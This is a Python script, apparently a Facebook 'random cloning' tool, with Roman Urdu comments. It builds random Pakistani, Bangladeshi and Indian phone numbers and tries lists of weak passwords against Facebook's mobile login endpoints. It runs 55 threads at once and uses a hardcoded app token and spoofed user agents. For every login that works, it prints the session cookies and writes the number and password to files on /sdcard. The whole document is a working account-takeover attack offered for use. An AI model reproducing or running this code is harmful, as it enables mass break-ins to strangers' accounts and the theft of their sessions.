"""
Note : ismen india, or bd ke codes ka maybe
 kuch masla ho awp usko theek kardena main
 pak se hun so mujhe bd or india ke codes
ka noii pata.

ismen maine 2 methods lagaye hain 
1 b-api or 2 b-graph agar m1 ya m2 men
cp id aaye ua change kro agar koii bhii id
na aaye toh headers + data change kro
"""


import os
import sys
import time
import uuid
import json
import string
import random
import requests
from requests.exceptions import ConnectionError as net_error
from concurrent.futures import ThreadPoolExecutor as speed

e = "\033[0m"
r = "\033[1;31m"
g = "\033[1;32m"
y = "\033[1;33m"
b = "\033[1;34m"
p = "\033[1;35m"
c = "\033[1;36m"
w = "\033[1;37m"

loop = 0
digits = []
okacc = []
cpacc = []

def logo():
    os.system("clear")
    print(banner)

def linex():
    print(f"{w}==================================================")

def xxx(x):
    return f"{w}[{g}{x}{w}]"

def main():
    logo()
    print(f" {xxx('1')} Random Cloning ")
    print(f" {xxx('2')} Contact with Author ")
    print(f" {xxx('3')} Exit Tools ")
    linex()
    hxb = input(f" {xxx('?')} Select : ")
    if "1" in hxb:
        r_number()
    elif "2" in hxb:
        os.system("xdg-open https://www.facebook.com/MR.K4ZIM.404")
        main()
    elif "3" in hxb:
        linex()
        print(f" {xxx('!')} {g}Thanks For Using Tools ")
        linex()
        sys.exit()
    else:
        linex()
        print(f" {xxx('!')} {g}Select Valid Option ")
        linex()
        time.sleep(1)
        main()

def r_number():
    logo()
    print(f" {xxx('1')} Pak Cloning ")
    print(f" {xxx('2')} Bd Cloning ")
    print(f" {xxx('3')} India Cloning ")
    linex()
    c = input(f" {xxx('?')} Select : ")
    if "1" in c:
        pak()
    elif "2" in c:
        bd()
    elif "3" in c:
        india()
    else:
        linex()
        print(f" {xxx('!')} {g}Select Valid Option ")
        linex()
        time.sleep(1)
        main()

def pak():
    logo()
    print(f" {xxx('•')} Example : {g}0310, 0320, 0330, 0340 ")
    linex()
    code = input(f" {xxx('?')} Enter Code : ")
    logo()
    print(f" {xxx('•')} Exampel : {g}1000, 2000, 5000, 10000 ")
    linex()
    limit = int(input(f" {xxx('?')} Enter Limit : "))
    for _ in range(limit):
        digits.append("".join(random.choices(string.digits, k=7)))
    logo()
    print(f" {xxx('1')} Method (B-Api) ")
    print(f" {xxx('2')} Method (B-Graph) ")
    linex()
    m = input(f" {xxx('?')} Select : ")
    with speed(max_workers=55) as process:
        logo()
        total_idz = str(len(digits))
        print(f" {xxx('•')} Total Accounts  : {g}{total_idz} ")
        print(f" {xxx('•')} Code You Choose : {g}{code} ")
        print(f" {xxx('!')} {r}If No Result Turn On/Off Flight Mode ")
        linex()
        for love in digits:
            uid = code+love
            pword = [love,code+love,"pakistan","janjan","king123","kingkhan","malik123","baloch123"]
            if "1" in m:
                process.submit(m1, uid, pword, total_idz)
            elif "2" in m:
                process.submit(m2, uid, pword, total_idz)
            else:
                process.submit(m1, uid, pword, total_idz)
    linex()
    print(f" {xxx('!')} Process Completed ")
    print(f" {xxx('•')} Total Ok Accounts : {g}{str(len(okacc))} ")
    print(f" {xxx('•')} Total Cp Accounts : {r}{str(len(cpacc))} ")
    linex()
    input(f" {xxx('!')} Press Enter To Back ")
    sys.exit()

def bd():
    logo()
    print(f" {xxx('•')} Example : {g}016, 017, 018, 019 ")
    linex()
    code = input(f" {xxx('?')} Enter Code : ")
    logo()
    print(f" {xxx('•')} Exampel : {g}1000, 2000, 5000, 10000 ")
    linex()
    limit = int(input(f" {xxx('?')} Enter Limit : "))
    for _ in range(limit):
        digits.append("".join(random.choices(string.digits, k=7)))
    logo()
    print(f" {xxx('1')} Method (B-Api) ")
    print(f" {xxx('2')} Method (B-Graph) ")
    linex()
    m = input(f" {xxx('?')} Select : ")
    with speed(max_workers=55) as process:
        logo()
        total_idz = str(len(digits))
        print(f" {xxx('•')} Total Accounts  : {g}{total_idz} ")
        print(f" {xxx('•')} Code You Choose : {g}{code} ")
        print(f" {xxx('!')} {r}If No Result Turn On/Off Flight Mode ")
        linex()
        for love in digits:
            uid = code+love
            pword = [love[1:],love,code+love,"i love you","iloveyou","bangladesh","bangladesh123","708090","102030","777000","888000","999000","123456"]
            if "1" in m:
                process.submit(m1, uid, pword, total_idz)
            elif "2" in m:
                process.submit(m2, uid, pword, total_idz)
            else:
                process.submit(m1, uid, pword, total_idz)
    linex()
    print(f" {xxx('!')} Process Completed ")
    print(f" {xxx('•')} Total Ok Accounts : {g}{str(len(okacc))} ")
    print(f" {xxx('•')} Total Cp Accounts : {r}{str(len(cpacc))} ")
    linex()
    input(f" {xxx('!')} Press Enter To Back ")
    sys.exit()

def india():
    logo()
    print(f" {xxx('•')} Example : {g}091, 092, 093, 094 ")
    linex()
    code = input(f" {xxx('?')} Enter Code : ")
    logo()
    print(f" {xxx('•')} Exampel : {g}1000, 2000, 5000, 10000 ")
    linex()
    limit = int(input(f" {xxx('?')} Enter Limit : "))
    for _ in range(limit):
        digits.append("".join(random.choices(string.digits, k=7)))
    logo()
    print(f" {xxx('1')} Method (B-Api) ")
    print(f" {xxx('2')} Method (B-Graph) ")
    linex()
    m = input(f" {xxx('?')} Select : ")
    with speed(max_workers=55) as process:
        logo()
        total_idz = str(len(digits))
        print(f" {xxx('•')} Total Accounts  : {g}{total_idz} ")
        print(f" {xxx('•')} Code You Choose : {g}{code} ")
        print(f" {xxx('!')} {r}If No Result Turn On/Off Flight Mode ")
        linex()
        for love in digits:
            uid = code+love
            pword = [love,code+love,"57273200","59039200"]
            if "1" in m:
                process.submit(m1, uid, pword, total_idz)
            elif "2" in m:
                process.submit(m2, uid, pword, total_idz)
            else:
                process.submit(m1, uid, pword, total_idz)
    linex()
    print(f" {xxx('!')} Process Completed ")
    print(f" {xxx('•')} Total Ok Accounts : {g}{str(len(okacc))} ")
    print(f" {xxx('•')} Total Cp Accounts : {r}{str(len(cpacc))} ")
    linex()
    input(f" {xxx('!')} Press Enter To Back ")
    sys.exit()

def m1(uid, pword, total_idz):
    global loop
    global okacc
    global cpacc
    sys.stdout.write(f"\r {w}[H X B-M1] [{loop}/{total_idz}] [OK/CP] [{len(okacc)}/{len(cpacc)}]\r"),
    sys.stdout.flush()
    try:
        for pw in pword:
            ua_string = "[FBAN/FB4A;FBAV/59.0.0.13.313;FBBV/19955390;FBDM/{density=2.0,width=1600,height=2560};FBLC/en_US;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T700;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/332.0.0.23.111;FBBV/311606708;FBDM/{density=1.5,width=480,height=903};FBLC/en_US;FBRV/314177058;FBCR/Telkom-Mona;FBMF/Android;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-S10+;FBSV/9.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/8.0.0.26.24;FBBV/2119853;FBDM/{density=1.5,width=480,height=800};FBLC/tr_TR;FBCR/VODAFONE TR;FBPN/com.facebook.katana;FBDV/GT-I8552;FBSV/4.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/75.0.0.23.69;FBBV/29142907;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/Jazz;FBMF/QMobile;FBBD/QMobile;FBPN/com.facebook.katana;FBDV/QMobile i6 Metal ONE;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/365.0.0.30.112;FBBV/367653576;FBDM/{density=2.25,width=720,height=1400};FBLC/en_Qaau_US;FBRV/369757394;FBCR/Vi India;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/RMX1945;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
            data = {
                "email": uid,
                "password": pw,
                "cpl": "true",
                "credentials_type": "password",
                "error_detail_type": "button_with_disabled",
                "source": "login",
                "format": "json",
                "generate_session_cookies": "1",
                "generate_analytics_claim": "1",
                "generate_machine_id": "1",
            }
            headers = {
                "accept-encoding": "gzip, deflate", 
                "Accept": "*/*", 
                "Connection": "keep-alive", 
                "content-type": "application/x-www-form-urlencoded", 
                "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32", 
                "x-fb-friendly-name": "authenticate", 
                "x-fb-http-engine": "Liger",
                "user-agent": ua_string,
            }
            url = "https://b-api.facebook.com/method/auth.login"
            result = requests.post(url, data=data, headers=headers).json()
            if "session_key" in result:
                coki = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
                print(f" {g}[H X B-OK] {uid} | {pw}")
                print(f" {w}Cookies : {g}{coki}")
                open("/sdcard/H X B-Ok.txt", "a").write(f"{uid}|{pw}\n")
                okacc.append(uid)
                break
            elif result["error_code"] == 405:
                print(f" {r}[H X B-CP] {uid} | {pw}")
                open("/sdcard/H X B-Cp.txt", "a").write(f"{uid}|{pw}\n")
                cpacc.append(uid)
                break
            else:
                continue
        loop+=1
    except net_error:
        time.sleep(10)
    except:
        pass

def m2(uid, pword, total_idz):
    global loop
    global okacc
    global cpacc
    sys.stdout.write(f"\r {w}[H X B-M2] [{loop}/{total_idz}] [OK/CP] [{len(okacc)}/{len(cpacc)}]\r"),
    sys.stdout.flush()
    try:
        for pw in pword:
            ua_string = "[FBAN/FB4A;FBAV/59.0.0.13.313;FBBV/19955390;FBDM/{density=2.0,width=1600,height=2560};FBLC/en_US;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T700;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/332.0.0.23.111;FBBV/311606708;FBDM/{density=1.5,width=480,height=903};FBLC/en_US;FBRV/314177058;FBCR/Telkom-Mona;FBMF/Android;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-S10+;FBSV/9.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/8.0.0.26.24;FBBV/2119853;FBDM/{density=1.5,width=480,height=800};FBLC/tr_TR;FBCR/VODAFONE TR;FBPN/com.facebook.katana;FBDV/GT-I8552;FBSV/4.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/75.0.0.23.69;FBBV/29142907;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/Jazz;FBMF/QMobile;FBBD/QMobile;FBPN/com.facebook.katana;FBDV/QMobile i6 Metal ONE;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/365.0.0.30.112;FBBV/367653576;FBDM/{density=2.25,width=720,height=1400};FBLC/en_Qaau_US;FBRV/369757394;FBCR/Vi India;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/RMX1945;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
            data = {
                "adid": str(uuid.uuid4()),
                "format": "json",
                "device_id": str(uuid.uuid4()),
                "email": uid,
                "password": pw,
                "generate_analytics_claims": "1",
                "credentials_type": "password",
                "source": "login",
                "error_detail_type": "button_with_disabled",
                "enroll_misauth": "false",
                "generate_session_cookies": "1",
                "generate_machine_id": "1",
                "fb_api_req_friendly_name": "authenticate",
            }
            headers = {
                "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "X-FB-Friendly-Name": "authenticate",
                "X-FB-Connection-Type": "unknown",
                "User-Agent": ua_string,
                "Accept-Encoding": "gzip, deflate",
                "Content-Type": "application/x-www-form-urlencoded",
                "X-FB-HTTP-Engine": "Liger",
            }
            url = "https://b-graph.facebook.com/auth/login"
            result = requests.post(url, data=data, headers=headers).json()
            if "session_key" in result:
                try:
                    uid = result["uid"]
                except:
                    uid = uid
                coki = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
                print(f" {g}[H X B-OK] {uid} | {pw}")
                print(f" {w}Cookies : {g}{coki}")
                open("/sdcard/H X B-Ok.txt", "a").write(f"{uid}|{pw}\n")
                okacc.append(uid)
                break
            elif "www.facebook.com" in result["error"]["message"]:
                try:
                    uid = result["error"]["error_data"]["uid"]
                except:
                    uid = uid
                print(f" {r}[H X B-CP] {uid} | {pw}")
                open("/sdcard/H X B-Cp.txt", "a").write(f"{uid}|{pw}\n")
                cpacc.append(uid)
                break
            else:
                continue
        loop+=1
    except net_error:
        time.sleep(10)
    except:
        pass

banner = f"""{w}\
{w}      $$$$$$$$\ $$$$$$$$\ $$$$$$$$\  $$$$$$\  $$\   $$\ $$\   $$\ 
\____$$  |$$  _____|$$  _____|$$  __$$\ $$ |  $$ |$$ |  $$ |
    $$  / $$ |      $$ |      $$ /  \__|$$ |  $$ |$$ |  $$ |
   $$  /  $$$$$\    $$$$$\    \$$$$$$\  $$$$$$$$ |$$ |  $$ |
  $$  /   $$  __|   $$  __|    \____$$\ $$  __$$ |$$ |  $$ |
 $$  /    $$ |      $$ |      $$\   $$ |$$ |  $$ |$$ |  $$ |
$$$$$$$$\ $$$$$$$$\ $$$$$$$$\ \$$$$$$  |$$ |  $$ |\$$$$$$  |
\________|\________|\________| \______/ \__|  \__| \______/
{w}     
{g}      ZESHU X HASHIR  
{w}==================================================
{g} >> Author  :   ZESHU X HASHIR
{r} >> Github  :  Z3SHU_420
{g} >> Verison :  PERSON 
{r}==================================================\
"""

if __name__ == "__main__":
    main()